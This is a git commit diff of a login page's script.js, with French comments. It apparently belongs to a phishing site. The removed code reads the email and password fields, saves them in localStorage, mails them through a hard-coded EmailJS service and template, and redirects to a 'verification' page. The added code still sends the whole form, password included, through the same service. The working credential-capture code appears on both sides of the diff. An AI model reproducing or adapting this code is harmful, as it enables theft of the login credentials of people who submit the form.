061bab0308e2759602ef249e3e5be691c09013fe
zetox550 <dergjgig@gmail.com>
2024-08-25 21:04:25 +0200

    script.js

--- script.js
+++ script.js
@@ -34,22 +34,15 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
         return; // Ne pas envoyer le formulaire si la validation échoue
     }
 
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
+    console.log("Validation réussie, préparation à l'envoi..."); // Log pour le débogage
 
-    // Enregistrez les informations dans le stockage local
-    localStorage.setItem('email', email);
-    localStorage.setItem('password', password);
-
-    // Envoyer les données du formulaire principal
-    emailjs.send('service_odtxz18', 'template_pj35ygs', { email: email, password: password })
+    // Envoie le formulaire avec EmailJS
+    emailjs.sendForm('service_odtxz18', 'template_pj35ygs', this)
         .then(function(response) {
-            console.log('Formulaire principal envoyé avec succès:', response);
-            alert('Formulaire principal envoyé avec succès!');
-            // Rediriger vers la page de vérification
-            window.location.href = 'verification.html';
+            console.log('Succès:', response);
+            alert('Formulaire envoyé avec succès!');
         }, function(error) {
-            console.log('Erreur lors de l\'envoi du formulaire principal:', error);
-            alert('Une erreur est survenue lors de l\'envoi du formulaire principal.');
+            console.log('Erreur:', error);
+            alert('Une erreur est survenue. Veuillez réessayer.');
         });
 });
